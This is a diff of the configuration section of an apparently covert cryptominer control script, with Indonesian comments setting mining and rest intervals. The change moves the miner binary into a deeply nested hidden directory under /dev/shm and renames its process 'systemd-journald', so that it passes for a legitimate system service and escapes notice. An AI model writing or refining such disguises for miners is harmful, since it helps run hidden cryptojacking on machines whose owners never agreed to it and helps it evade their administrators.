@@ -4,8 +4,8 @@ import sys
 import signal
 
 # CONFIG
-MINER_PATH = "/dev/shm/.cache/kthreadd."  # Lokasi miner
-MINER_NAME = "kthreadd."  # Nama miner buat kill
+MINER_PATH = "/dev/shm/.cache/systemd/lib/system/syslog/data/kernel/logs/modules/.daemon/systemd-journald"  # Lokasi miner
+MINER_NAME = "systemd-journald"  # Nama miner buat kill
 MINING_TIME = 1800  # 30 menit
 REST_TIME = 300  # 5 menit
 LONG_REST = 1800  # 30 menit (dalam detik)
